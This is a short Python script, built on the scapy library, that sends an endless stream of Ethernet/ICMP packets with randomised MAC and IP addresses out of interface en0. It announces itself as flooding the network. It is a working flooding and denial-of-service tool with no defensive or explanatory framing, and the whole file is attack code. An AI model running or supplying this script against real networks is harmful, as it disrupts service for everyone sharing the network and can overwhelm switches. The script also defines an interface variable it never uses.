from scapy.all import IP,sendp,Ether,RandIP,RandMAC,ICMP

packet=Ether(src=RandMAC("*:*:*:*:*:*"),dst=RandMAC("*:*:*:*:*:*"))/IP(src=RandIP('*.*.*.*'),dst=RandIP('*.*.*.*'))/ICMP()

dev='en0'

print('flooding net with random packets on dev')

sendp(packet,iface='en0',loop=1)